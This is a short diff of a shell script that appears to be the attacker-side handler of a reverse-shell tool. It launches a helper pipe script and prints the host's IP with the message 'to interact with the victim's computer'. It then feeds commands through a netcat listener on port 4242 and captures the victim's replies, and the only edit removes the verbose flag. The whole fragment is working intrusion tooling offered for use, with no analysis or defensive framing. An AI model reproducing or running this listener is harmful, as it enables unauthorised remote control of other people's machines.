@@ -12,4 +12,4 @@ chmod o+w .
 ./feedpipe.sh &
 echo "Go to http://$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1') to interact with the victim's computer"
 trap '[ -n "$(jobs -pr)" ] && kill $(jobs -pr) 2&>/dev/null ' INT QUIT TERM EXIT
-tail -f /tmp/reverseinput | nc -lvp 4242 > reverseresult
+tail -f /tmp/reverseinput | nc -lp 4242 > reverseresult
